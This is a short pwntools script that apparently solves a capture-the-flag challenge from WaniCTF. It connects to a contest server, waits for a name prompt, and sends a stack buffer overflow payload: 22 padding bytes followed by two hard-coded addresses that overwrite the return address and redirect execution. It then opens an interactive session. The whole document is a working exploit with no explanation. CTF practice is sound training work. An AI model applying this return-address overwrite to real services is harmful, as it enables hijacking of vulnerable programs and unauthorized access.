from pwn import *

io = remote("ret.wanictf.org", 9005)
#io = process("./pwn05")

ret = io.readuntil("What's your name?: ")
log.warn(ret)

payload = b"A" * 22
payload += p64(0x00400696)
payload += p64(0x0000000000400837)

log.warn(payload)

io.send(payload)
io.interactive()


